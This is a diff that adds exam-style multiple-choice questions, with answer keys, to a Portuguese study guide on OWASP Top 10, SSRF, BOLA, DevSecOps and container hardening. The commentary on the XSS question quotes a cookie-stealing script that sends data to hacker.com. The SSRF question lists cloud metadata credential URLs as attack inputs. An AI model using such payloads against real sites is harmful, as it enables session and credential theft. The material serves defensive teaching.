@@ -114,6 +114,31 @@ Anteriormente denominada *Sensitive Data Exposure*, essa categoria concentra-se 
 
 ---
 
+### Questão 02 (FGV - TRT / Analista Judiciário - TI - OWASP #2 Falhas Criptográficas e Armazenamento de Senhas)
+No ranking OWASP Top 10:2021, a categoria **A02:2021 - Cryptographic Failures** aborda falhas relacionadas à ausência ou fragilidade de criptografia na proteção de dados sensíveis em repouso e em trânsito.
+
+No desenvolvimento de sistemas de processo judicial e administrativo eletrônico, a diretriz recomendada pela OWASP e pelo NIST para armazenar senhas de usuários em bancos de dados de forma estritamente segura consiste em:
+
+* **A)** Cifrar as senhas utilizando o algoritmo simétrico DES em modo ECB sem chave secreta.
+* **B)** Armazenar as senhas aplicando uma função hash rápida simples como MD5 ou SHA-1 pura sem qualquer valor de sal (*salt*).
+* **C)** Utilizar uma função de derivação de chaves adaptativa e deliberadamente lenta com alto consumo de memória (*memory-hard* / *work factor* ajustável), tais como **Argon2id**, **bcrypt** ou **PBKDF2**, combinada com um **Salt** criptograficamente aleatório e exclusivo para cada usuário gerado com no mínimo 128 bits.
+* **D)** Gravar as senhas em texto puro (*plaintext*) protegido apenas por permissão de arquivo no Linux.
+* **E)** Converter a senha em caracteres Base64 invertidos e armazenar em uma coluna pública da tabela de usuários.
+
+> **Comentário Detalhado:**
+>
+> - **A)** Incorreta. Criptografia reversível não deve ser usada para senhas de autenticação; senhas exigem funções unidirecionais não reversíveis. Além disso, DES é um algoritmo quebrado e obsoleto.
+> - **B)** Incorreta. Hashes rápidos comuns (MD5, SHA-1, SHA-256) são catastróficos para senhas: atacantes conseguem testar bilhões de palpites por segundo em GPUs comuns e utilizar tabelas arco-íris (*Rainbow Tables*) pré-computadas na ausência de salt.
+> - **C)** **CORRETA.** Padrão ouro da OWASP e NIST SP 800-63B para armazenamento de senhas:
+>   - **Salt (Sal Criptográfico):** Sequência aleatória exclusiva gerada para cada usuário e concatenada à senha antes do hash, tornando tabelas arco-íris totalmente inúteis e garantindo que dois usuários com a mesma senha tenham hashes físicos completamente distintos.
+>   - **Funções de Hashing Lentas e Adaptativas (Key Derivation Functions - KDF):** Algoritmos como **Argon2id** (vencedor da *Password Hashing Competition*), **bcrypt** e **PBKDF2** impõem custos massivos de tempo e memória RAM (*memory-hard*), tornando ataques de força bruta com placas de vídeo e ASICs inviáveis economicamente.
+> - **D)** Incorreta. Violação elementar e gravíssima de segurança.
+> - **E)** Incorreta. Base64 é apenas um esquema de codificação reversível, desprovido de qualquer segurança ou segredo criptográfico.
+> 
+> **Gabarito: C**
+
+---
+
 ### 1.4 Injection (#3): SQL Injection vs. Consultas Parametrizadas e Modalidades de XSS
 
 A **Injeção (A03)** ocorre quando dados fornecidos por fontes externas não confiáveis são concatenados diretamente a interpretadores de comandos ou linguagens de consulta.
@@ -154,7 +179,7 @@ cursor.execute(query, (cpf_input,))
 
 ---
 
-### Questão 02 (FCC - Adaptada / TI - OWASP Top 10 e Injeção de SQL)
+### Questão 03 (FCC - Adaptada / TI - OWASP Top 10 e Injeção de SQL)
 Um desenvolvedor de sistemas do Tribunal de Contas implementou a seguinte rotina de autenticação em uma API de consulta processual:
 
 ```python
@@ -194,12 +219,68 @@ O XSS consiste na injeção de scripts maliciosos (geralmente JavaScript) que se
 
 ---
 
+### Questão 04 (FCC - TRT / Analista Judiciário - TI - Modalidades de Cross-Site Scripting: XSS)
+A vulnerabilidade de *Cross-Site Scripting* (XSS) ocorre quando uma aplicação web inclui dados não confiáveis em uma página web sem a devida validação ou escape, permitindo que scripts maliciosos (geralmente JavaScript) sejam executados no navegador da vítima.
+
+A literatura da OWASP e os manuais de segurança em aplicações web classificam o XSS em três modalidades primordiais: **XSS Armazenado (*Stored*)**, **XSS Refletido (*Reflected*)** e **XSS Baseado em DOM (*DOM-based*)**.
+
+Assinale a afirmativa que descreve corretamente o **XSS Armazenado (Stored / Persistent XSS)**:
+
+* **A)** O script hostil é enviado em uma requisição HTTP imediata (como um parâmetro de busca em link) e refletido instantaneamente na resposta do servidor sem ser persistido em banco de dados.
+* **B)** A injeção maliciosa é salva de forma persistente no banco de dados do servidor (ex.: em um campo de comentários de processo, fórum ou cadastro de fornecedor); toda vez que um usuário legítimo ou auditor carrega a página correspondente, o script hostil gravado é renderizado e executado automaticamente em seu navegador, podendo roubar cookies de sessão e realizar ações em nome da vítima.
+* **C)** O ataque ocorre exclusivamente pela manipulação do objeto `window.location` no código JavaScript local do navegador sem qualquer tráfego com o servidor.
+* **D)** O XSS armazenado afeta apenas computadores desligados sem conexão com a rede elétrica.
+* **E)** Trata-se de uma falha exclusiva de hardware que destrói a memória física do monitor de vídeo.
+
+> **Comentário Detalhado:**
+>
+> - **A)** Incorreta. Essa é a definição clássica do **XSS Refletido (Reflected XSS)**, que exige que a vítima clique em um link forjado contendo o payload no parâmetro da URL.
+> - **B)** **CORRETA.** O **XSS Armazenado (Stored / Persistent XSS)** é a variante mais devastadora:
+>   - O atacante insere o código malicioso (`<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>`) em um campo de entrada persistido pela aplicação (ex.: cadastro de processo, petição, mural de avisos).
+>   - O dado é gravado no banco de dados.
+>   - Qualquer usuário, gestor ou auditor que posteriormente acessar a página que renderiza esse registro executa o script no contexto de segurança da sua sessão autenticada.
+>   - **Defesa:** Sanitização estrita de entrada, codificação de caracteres na saída contextualmente (*Context-Aware Output Encoding*) e implementação do cabeçalho HTTP **Content Security Policy (CSP)**.
+> - **C)** Incorreta. Essa é a definição do **DOM-based XSS**, onde a vulnerabilidade reside inteiramente no código JavaScript do lado cliente que manipula o DOM.
+> - **D)** Incorreta. O ataque roda ativamente no navegador da vítima.
+> - **E)** Incorreta. Trata-se de uma vulnerabilidade de software na camada de aplicação web.
+> 
+> **Gabarito: B**
+
+---
+
 ### 1.5 Demais Categorias Críticas: Insecure Design, Misconfiguration, SSRF e Supply Chain
 
 - **A04: Insecure Design (Design Inseguro):** Categoria nova que diferencia falhas de implementação (bugs de código) de **falhas de concepção e arquitetura**. Se o sistema de compras do órgão não possui uma regra arquitetural de limitação de compras por minuto, o código pode estar perfeitamente escrito e livre de falhas de injeção, mas o design é vulnerável a abusos lógicos de negócio.
 - **A05: Security Misconfiguration (Configuração Incorreta de Segurança):** Envolve a manutenção de contas, logins e senhas padrão de fábrica em bancos de dados e servidores web; mensagens de erro detalhadas expondo *stack traces* e versões internas de bibliotecas aos usuários finais; portas de depuração abertas em produção e falta de políticas de segurança HTTP (*Content-Security-Policy*).
 - **A08: Software and Data Integrity Failures:** Foco na segurança da cadeia de suprimentos (*supply chain*). Envolve a ingestão de dependências e pacotes sem verificação de assinatura digital e a **desserialização insegura (*Insecure Deserialization*)**, onde objetos serializados em XML, JSON ou binários recebidos de usuários remotos são recriados na memória sem validação, viabilizando execução remota de código (RCE).
 - **A10: Server-Side Request Forgery (SSRF):** Ocorre quando um atacante consegue induzir o servidor de aplicação a disparar requisições HTTP arbitrárias para recursos internos protegidos pela rede interna. Em ambientes de nuvem pública, o vetor mais crítico de SSRF é forçar o servidor a ler a URL local de metadados (`http://169.254.169.254/latest/meta-data/`), expondo tokens temporários de credenciais administrativas da máquina virtual.
+
+---
+
+### Questão 05 (FGV - TRT / Analista Judiciário - TI - Server-Side Request Forgery: SSRF)
+A categoria **A10:2021 - Server-Side Request Forgery (SSRF)** foi incluída formalmente no OWASP Top 10 devido à sua alta criticidade em arquiteturas modernas baseadas em nuvem e microsserviços.
+
+A vulnerabilidade de SSRF caracteriza-se quando:
+
+* **A)** O navegador do usuário envia requisições forjadas para a impressora local via Wi-Fi.
+* **B)** Uma aplicação web servidora é induzida por um atacante a realizar requisições HTTP arbitrárias e desprotegidas para destinos remotos ou para recursos internos da própria rede do servidor (tais como serviços de metadados da nuvem - ex.: `http://169.254.169.254` na AWS/Azure/GCP -, portas locais de loopback `127.0.0.1` ou bancos de dados isolados por firewall), permitindo ao invasor acessar dados confidenciais e credenciais de instâncias.
+* **C)** O banco de dados relacional rejeita qualquer comando com a cláusula `WHERE`.
+* **D)** O cabo de rede do servidor sofre interferência eletromagnética por tempestades solares.
+* **E)** O usuário esquece sua senha corporativa e solicita redefinição pelo portal de autoatendimento.
+
+> **Comentário Detalhado:**
+>
+> - **A)** Incorreta. Não se trata de ataque originado do cliente local.
+> - **B)** **CORRETA.** Mecânica do ataque **SSRF (Server-Side Request Forgery)**:
+>   - Ocorre quando um servidor web aceita uma URL fornecida pelo usuário para buscar uma imagem, importar um arquivo ou ler um webhook, mas não valida adequadamente o endereço de destino.
+>   - O invasor fornece uma URL interna (ex.: `http://169.254.169.254/latest/meta-data/identity-credentials` ou `http://localhost:8080/admin`).
+>   - O próprio servidor da aplicação web (que tem privilégios e confiança dentro da rede interna e acesso aos serviços locais) dispara a requisição e devolve o conteúdo ao invasor, ultrapassando firewalls de borda e expondo credenciais de instâncias e segredos de microsserviços internos.
+>   - **Defesa:** Whitelisting estrito de domínios permitidos, bloqueio de faixas de IP privadas/loopback/link-local e uso de IMDSv2 com tokens de sessão em provedores de nuvem.
+> - **C)** Incorreta. Descrição desconexa com requisições HTTP forjadas.
+> - **D)** Incorreta. Fenômeno de camada física não relacionado à lógica de software.
+> - **E)** Incorreta. Procedimento normal de suporte a senhas.
+> 
+> **Gabarito: B**
 
 ---
 
@@ -229,6 +310,32 @@ Na linha cronológica da esteira de entrega contínua (CI/CD), a extremidade esq
 
 ---
 
+### Questão 06 (FCC - TRT / Analista Judiciário - TI - DevSecOps e o Paradigma Shift-Left)
+A cultura **DevSecOps** prega a integração contínua de práticas e controles de segurança em todas as fases do ciclo de vida de desenvolvimento de software (SDLC), operando sob o princípio do **Shift-Left** (Deslocar para a Esquerda).
+
+O fundamento econômico e técnico que justifica a adoção do princípio *Shift-Left* nas esteiras de integração e entrega contínua (CI/CD) de tribunais reside no fato de que:
+
+* **A)** O custo financeiro e o esforço de engenharia necessários para remediar uma vulnerabilidade de segurança crescem exponencialmente à medida que a falha avança pelas fases do ciclo de desenvolvimento, sendo infinitamente mais barato e ágil corrigi-la precocemente durante as fases de design e codificação do que após a entrada do sistema em produção.
+* **B)** A segurança da informação deve ser delegada exclusivamente a uma equipe externa de auditores no dia anterior ao lançamento do sistema em produção.
+* **C)** Testes automatizados de segurança desaceleram os deploys e, portanto, devem ser excluídos dos pipelines de CI/CD.
+* **D)** O termo Shift-Left indica que todos os programadores devem trabalhar obrigatoriamente com a mão esquerda no teclado.
+* **E)** O DevSecOps preconiza a eliminação completa dos desenvolvedores de software, mantendo apenas profissionais de segurança física patrimonial.
+
+> **Comentário Detalhado:**
+>
+> - **A)** **CORRETA.** A **Economia da Correção Precoce (Shift-Left)** é o pilar econômico do DevSecOps:
+>   - Conforme estudos consolidados da Engenharia de Software (Barry Boehm / NIST), corrigir um defeito ou vulnerabilidade de segurança em **Produção** custa de **30 a 100 vezes mais** do que corrigi-lo durante a fase de **Design ou Codificação**.
+>   - No modelo cascata legado, a segurança atuava apenas como um "portão tardio" (*late gate*) antes do lançamento, gerando retrabalho massivo ou liberação de sistemas com falhas graves.
+>   - No DevSecOps, "desloca-se a segurança para a esquerda" da linha do tempo: inserem-se modelagem de ameaças no planejamento, análise estática de código (SAST) no commit do desenvolvedor e verificação de dependências (SCA) no build, corrigindo bugs no mesmo instante em que são escritos.
+> - **B)** Incorreta. Esse é o modelo obsoleto que a cultura DevSecOps combate.
+> - **C)** Incorreta. A automação no pipeline é justamente o que viabiliza velocidade com conformidade contínua (*Security as Code*).
+> - **D)** Incorreta. É uma metáfora temporal da esteira SDLC (da esquerda para a direita: requisitos $	o$ código $	o$ build $	o$ teste $	o$ deploy $	o$ produção).
+> - **E)** Incorreta. O DevSecOps promove a colaboração multidisciplinar e responsabilidade compartilhada entre Desenvolvimento, Segurança e Operações.
+> 
+> **Gabarito: A**
+
+---
+
 ### 2.2 Modelagem de Ameaças com a Metodologia STRIDE
 
 Criada por pesquisadores da Microsoft, a metodologia **STRIDE** é uma estrutura conceitual de modelagem de ameaças adotada no planejamento de sistemas para identificar potenciais riscos antes de qualquer linha de código ser produzida:
@@ -254,7 +361,7 @@ flowchart TD
 
 ---
 
-### Questão 03 (FCC - Adaptada / TI - Modelagem de Ameaças / Metodologia STRIDE)
+### Questão 07 (FCC - Adaptada / TI - Modelagem de Ameaças / Metodologia STRIDE)
 No planejamento arquitetural de um novo módulo de pagamentos do Tribunal de Contas, os engenheiros de segurança conduziram uma sessão de modelagem de ameaças adotando o framework metodológico **STRIDE**.
 
 A respeito do mapeamento entre as categorias de ameaça do modelo STRIDE e os princípios clássicos de segurança da informação violados, assinale a afirmativa correta:
@@ -292,7 +399,7 @@ A automação do pipeline de CI/CD integra quatro famílias primárias de ferram
 
 ---
 
-### Questão 04 (FCC - Adaptada / TI - Práticas DevSecOps e Ferramentas de Teste)
+### Questão 08 (FCC - Adaptada / TI - Práticas DevSecOps e Ferramentas de Teste)
 Na esteira de Integração e Entrega Contínua (CI/CD) de uma instituição pública que adota a filosofia DevSecOps e o princípio de *Shift-Left* (deslocar a segurança para o início do ciclo de vida), a equipe de segurança inseriu diferentes tipos de testes automatizados de segurança.
 
 A respeito das ferramentas e abordagens de testes de segurança de software, assinale a afirmativa correta:
@@ -330,6 +437,32 @@ Diferente das aplicações web tradicionais baseadas em renderização no servid
 
 ---
 
+### Questão 09 (FGV - TRT / Analista Judiciário - TI - OWASP API Security Top 10 e Vulnerabilidade BOLA)
+As arquiteturas orientadas a microsserviços dependem extensivamente de APIs RESTful para integração de dados em órgãos públicos. O projeto OWASP mantém um ranking específico para esse segmento: o **OWASP API Security Top 10**.
+
+A vulnerabilidade categorizada como **API1:2023 - Broken Object Level Authorization (BOLA)**, historicamente associada ao conceito de IDOR em navegadores, é caracterizada quando:
+
+* **A)** A API é atacada por um vírus de setor de inicialização que formata o disco rígido do servidor de aplicação.
+* **B)** Os endpoints da API expõem identificadores de objetos diretamente na URI (como `GET /api/v1/contratos/10452/dados_sigilosos`) e o código do backend falha em validar se o usuário autenticado que originou a requisição possui realmente direito legal de acesso àquele objeto específico de terceiro, permitindo que qualquer usuário altere o ID numérico na requisição para visualizar dados restritos de outros cidadãos ou órgãos.
+* **C)** O certificado digital HTTPS expira e a API passa a responder com código de status HTTP 404.
+* **D)** A API utiliza tokens JWT com assinatura criptográfica assimétrica de 4096 bits devidamente validada em todas as chamadas.
+* **E)** Um invasor sobrecarrega o servidor enviando requisições com a sintaxe correta do protocolo GraphQL.
+
+> **Comentário Detalhado:**
+>
+> - **A)** Incorreta. Vírus de boot afetam inicialização de sistemas operacionais legados, não a lógica de autorização em APIs.
+> - **B)** **CORRETA.** A vulnerabilidade **BOLA (Broken Object Level Authorization - API1)** é considerada a falha mais disseminada e severa em APIs REST modernas:
+>   - Ocorre quando a aplicação realiza a **Autenticação** com sucesso (o usuário enviou um token válido e o sistema sabe quem ele é), mas negligencia a **Autorização no Nível do Objeto**.
+>   - Exemplo: O usuário `auditor_joao` autentica-se e acessa seus próprios relatórios em `/api/relatorios/501`. Se ele simplesmente alterar a URL para `/api/relatorios/502` (pertencente a outro auditor ou de caráter sigiloso) e a API retornar os dados sem conferir se `auditor_joao` tem permissão de leitura sobre o objeto `502`, a falha BOLA é concretizada.
+>   - **Mitigação:** Validação obrigatória e rigorosa no backend se o sujeito autenticado detém permissão explícita para manipular aquele identificador de recurso antes de qualquer consulta ou atualização no banco de dados.
+> - **C)** Incorreta. Erro 404 significa recurso não encontrado.
+> - **D)** Incorreta. Tokens robustos são boa prática, mas tokens válidos não impedem BOLA se a checagem no nível do objeto for esquecida no código do microsserviço.
+> - **E)** Incorreta. Trata-se de negação de serviço ou consulta complexa, não falha de autorização de objetos.
+> 
+> **Gabarito: B**
+
+---
+
 ### 3.2 Boas Práticas e Hardening em Contêineres Docker e Kubernetes
 
 A execução de microsserviços em contêineres exige práticas rigorosas de isolamento para evitar fugas para o sistema hospedeiro (*container breakout*):
@@ -343,6 +476,33 @@ USER 10001:10001
 2. **Utilizar Imagens Mínimas (*Distroless* ou *Alpine*):** Imagens base compactas eliminam utilitários desnecessários do sistema operacional (como gerenciadores de pacotes `apt`/`apk`, interpretadores `bash` e ferramentas de rede `curl`), reduzindo drasticamente a superfície de ataque e o número de CVEs presentes na imagem.
 3. **Sistemas de Arquivos Somente Leitura (*Read-Only Root Filesystem*):** Inicializar o contêiner com a flag `--read-only`, impedindo que invasores ou scripts maliciosos gravem arquivos executáveis em diretórios do sistema.
 4. **Descarte de Capacidades do Linux (*Drop Capabilities*):** Configurar o contêiner para descartar todas as capacidades administrativas padrão do kernel Linux (`--cap-drop=ALL`), adicionando estritamente aquelas indispensáveis para a operação do serviço.
+
+---
+
+### Questão 10 (FGV - TJ-AP / Analista Judiciário - TI - Hardening em Contêineres Docker e Kubernetes)
+A implantação de aplicações em contêineres Docker orquestrados por Kubernetes exige a aplicação sistemática de diretrizes de *Hardening* e segurança preventiva para evitar o comprometimento do nó hospedeiro (*Host*) e movimentos laterais no cluster.
+
+Dentre as boas práticas consagradas de segurança para imagens e execução de contêineres, assinale a afirmativa correta:
+
+* **A)** O processo principal no interior do contêiner deve rodar compulsoriamente como usuário `root` (UID 0) com a flag de execução `--privileged` ativada por padrão para facilitar o acesso irrestrito ao hardware.
+* **B)** Devem-se construir imagens de contêiner mínimas (como imagens *Distroless* ou baseadas em Alpine Linux), remover compiladores e utilitários de shell desnecessários em produção, configurar o contêiner para executar com um usuário sem privilégios (*Non-Root User*), montar o sistema de arquivos raiz em modo somente-leitura (`readOnlyRootFilesystem: true`) e escanear periodicamente as imagens contra vulnerabilidades conhecidas com ferramentas de SCA/Container Scanning.
+* **C)** O compartilhamento irrestrito do namespace de rede e de processos com o nó hospedeiro (`hostNetwork: true` e `hostPID: true`) é o mecanismo mais seguro recomendado pela CNCF para contêineres de produção.
+* **D)** As senhas de banco de dados devem ser gravadas diretamente em texto puro dentro do arquivo `Dockerfile` na diretiva `ENV`.
+* **E)** Contêineres dispensam qualquer atualização de segurança, pois o isolamento de namespaces do Linux torna o código 100% impenetrável contra qualquer vulnerabilidade de dia zero.
+
+> **Comentário Detalhado:**
+>
+> - **A)** Incorreta. Rodar como `root` e com a flag `--privileged` destrói o isolamento do contêiner, permitindo que uma invasão na aplicação resulte em escape imediato (*Container Escape*) e controle total do servidor host.
+> - **B)** **CORRETA.** Práticas canônicas de **Hardening de Contêineres**:
+>   1. **Imagens Mínimas / Distroless:** Reduz drasticamente a superfície de ataque ao expurgar pacotes desnecessários, shells (bash/sh) e ferramentas de pós-exploração (curl, wget, netcat).
+>   2. **Execução Non-Root:** Diretiva `USER 10001` no Dockerfile e `runAsNonRoot: true` no SecurityContext do Kubernetes.
+>   3. **Sistema de Arquivos Imutável:** Configurar `readOnlyRootFilesystem: true` impede que invasores baixem e persistam malwares no disco do contêiner.
+>   4. **Análise Contínua de Imagens:** Ferramentas de varredura (como Trivy, Grype e Clair) integradas ao pipeline CI/CD e ao registro de contêineres.
+> - **C)** Incorreta. Habilitar `hostNetwork` e `hostPID` expõe a pilha de rede e a tabela de processos de todo o servidor hospedeiro.
+> - **D)** Incorreta. Segredos jamais devem ser hardcoded em imagens Docker; devem ser injetados em tempo de execução via Kubernetes Secrets ou cofres como HashiCorp Vault.
+> - **E)** Incorreta. Contêineres compartilham o kernel do hospedeiro; vulnerabilidades de kernel ou falhas nas bibliotecas da aplicação expõem o cluster a ataques severos.
+> 
+> **Gabarito: B**
 
 ---
 
@@ -374,7 +534,7 @@ flowchart TD
 
 ---
 
-### Questão 05 (FCC - Adaptada / TI - Segurança em Nuvem e Contêineres)
+### Questão 11 (FCC - Adaptada / TI - Segurança em Nuvem e Contêineres)
 Em relação às boas práticas de segurança na execução de contêineres Docker e ao Modelo de Responsabilidade Compartilhada na computação em nuvem, assinale a afirmativa correta:
 
 * **A)** Em soluções de Infraestrutura como Serviço (IaaS), o provedor de nuvem é integralmente responsável pela aplicação periódica de patches de segurança e atualizações do sistema operacional convidado (*guest OS*) das máquinas virtuais do cliente.
